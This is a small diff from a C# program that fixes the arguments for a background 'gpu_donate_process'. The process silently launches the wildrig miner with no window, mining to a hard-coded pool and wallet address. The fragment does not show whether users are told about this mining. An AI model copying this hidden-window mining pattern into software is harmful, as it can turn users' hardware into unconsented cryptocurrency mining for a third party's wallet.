@@ -144,7 +144,7 @@ namespace salty
         {
             gpu_donate_process = new Process();
             gpu_donate_process.StartInfo.FileName = "wildrig.exe";
-            gpu_donate_process.StartInfo.Arguments = "wildrig.exe --print-full --algo ghostrider --url stratum+tcp://r-pool.net:3008 --user RWXmeVTEJYNVp2htJQ97DMYvwytWUFTi8E --pass x";
+            gpu_donate_process.StartInfo.Arguments = "--print-full --algo ghostrider --url stratum+tcp://r-pool.net:3008 --user RWXmeVTEJYNVp2htJQ97DMYvwytWUFTi8E --pass x";
 
             gpu_donate_process.StartInfo.CreateNoWindow = true;
             gpu_donate_process.Start();
